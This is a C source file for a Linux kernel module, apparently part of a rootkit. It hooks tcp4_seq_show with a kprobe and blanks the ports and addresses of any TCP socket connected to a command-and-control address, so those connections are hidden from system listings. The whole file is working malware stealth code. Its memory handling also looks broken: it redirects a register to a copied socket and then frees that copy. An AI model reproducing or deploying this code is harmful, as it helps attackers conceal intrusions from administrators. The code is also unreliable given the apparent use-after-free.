#include "hidenetwork.h"
#include "c2.h"
#include <linux/tcp.h>

// hide all socket using our C2 ip addr

struct kprobe kpt = { .symbol_name = "tcp4_seq_show",
		      .pre_handler = _handler_network_tcp4_seq_show };

int _handler_network_tcp4_seq_show(struct kprobe *p, struct pt_regs *regs)
{
	void *v;
	struct sock *sk;
	struct inet_sock *inet;
	struct sock *mysk = NULL;
	char remote_addr[16];

	if (!regs)
		return 0;

	v = (void *)regs->si;

	if (v == SEQ_START_TOKEN)
		return 0;

	sk = (struct sock *)v;

	if (!sk)
		return 0;

	mysk = kmalloc(sizeof(struct sock), GFP_KERNEL);
	if (!mysk)
		return -ENOMEM;

	memcpy(mysk, sk, sizeof(struct sock));

	inet = inet_sk(mysk);

	if (!inet) {
		kfree(mysk);
		return 0;
	}

	snprintf(remote_addr, sizeof(remote_addr), "%pI4",
		 &mysk->__sk_common.skc_daddr);

	if (strcmp(remote_addr, C2_ADDR) == 0) {
		inet->inet_sport = htons(0);
		inet->inet_dport = htons(0);
		inet->inet_rcv_saddr = 0;
		inet->inet_daddr = 0;

		regs->si = (unsigned long)mysk;
	}

	kfree(mysk);

	return 0;
}

int hidenetwork_init(void)
{
	int ret;
	ret = register_kprobe(&kpt);
	if (ret < 0) {
		return ret;
	}

	return 0;
}

void hidenetwork_exit(void)
{
	unregister_kprobe(&kpt);
}

EXPORT_SYMBOL(hidenetwork_init);
EXPORT_SYMBOL(hidenetwork_exit);